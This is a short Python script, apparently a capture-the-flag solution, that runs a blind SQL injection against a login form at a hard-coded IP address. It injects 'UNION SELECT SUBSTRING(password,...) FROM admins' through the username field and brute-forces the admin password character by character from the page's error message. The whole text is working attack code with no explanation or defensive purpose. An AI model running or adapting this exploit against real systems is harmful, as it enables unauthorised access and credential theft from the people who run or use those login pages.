from urllib import request, parse

def test(char, pos):
    # X => index
    # Y => character to test against character at index X
    # username='+UNION+SELECT+SUBSTRING(password,X,1)+from+admins;&password=Y
    data='username=%27+UNION+SELECT+SUBSTRING%28password%2C+' + pos + '%2C+1%29+from+admins%3B&password=' + char
    req =  request.Request('http://35.190.155.168/2a6ec6db9b/login', data=data.encode('utf-8'))
    resp = request.urlopen(req)
    return 'Invalid password' not in resp.read().decode('utf-8')

for i in "123456789":
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ^$0123456789":
        if test(c, i):
            print("=> %s" % c)
            break